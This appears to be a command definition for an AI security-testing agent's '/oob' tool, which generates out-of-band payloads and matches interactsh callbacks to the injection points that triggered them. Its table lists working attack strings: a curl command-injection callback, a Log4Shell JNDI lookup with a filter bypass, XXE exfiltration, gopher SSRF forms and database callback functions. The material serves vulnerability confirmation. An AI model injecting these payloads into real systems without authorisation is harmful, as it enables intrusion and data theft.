---
description: Out-of-band orchestrator — confirm BLIND SSRF/XXE/SQLi/RCE/Log4Shell by correlating interactsh callbacks to the payload that fired them. Usage: /oob --payloads <oob-domain> [--class ssrf,sqli] | /oob --listen | /oob --correlate inter.jsonl --payloads-file p.json
---

# /oob

Confirm **blind** vulnerabilities that have no in-band signal. Wraps
ProjectDiscovery's `interactsh-client`: generates payloads embedding a unique
OOB hostname per injection point, then correlates inbound DNS/HTTP/SMTP
interactions back to the exact payload — turning un-provable blind bugs into
confirmed ones.

> Needs `interactsh-client` installed (`/arsenal interactsh-client` for the
> install hint). Payload generation + correlation work offline without it.

## Usage

```
# 1. start the listener (prints your OOB domain, streams interactions as JSON)
/oob --listen > inter.jsonl

# 2. generate payloads for that domain and inject them into the target
/oob --payloads cXXXX.oast.fun --class ssrf,xxe,sqli

# 3. correlate received callbacks to the payload that caused them
/oob --correlate inter.jsonl --payloads-file payloads.json
```

Run directly:

```bash
tools/oob_listener.py --payloads cXXXX.oast.fun --json > payloads.json
tools/oob_listener.py --listen > inter.jsonl
tools/oob_listener.py --correlate inter.jsonl --payloads-file payloads.json
```

## Classes covered

| Class | Sample payload |
|---|---|
| blind SSRF | `http://<uid>.<oob>/` (+ `@127.0.0.1`, gopher bypass forms) |
| blind XXE | `<!ENTITY x SYSTEM "http://<uid>.<oob>/x">` + OOB-DTD exfil |
| blind SQLi | MSSQL `xp_dirtree`, MySQL `LOAD_FILE`, Oracle `UTL_HTTP`, Postgres `COPY…PROGRAM` |
| blind RCE | `; curl http://<uid>.<oob>/`, `$(…)`, backticks, `\| ping`, PowerShell |
| Log4Shell | `${jndi:ldap://<uid>.<oob>/a}` (+ `${lower:j}` filter bypass) |

## Why this is the highest-leverage addition

Without OOB, the agent **cannot confirm** blind SSRF/XXE/SQLi/RCE — an entire
band of Critical bugs was structurally out of reach. Each payload carries a
unique marker (`ssrf-<random>.<oob>`) so a received callback proves *which*
injection point fired, ready to drop straight into a report.
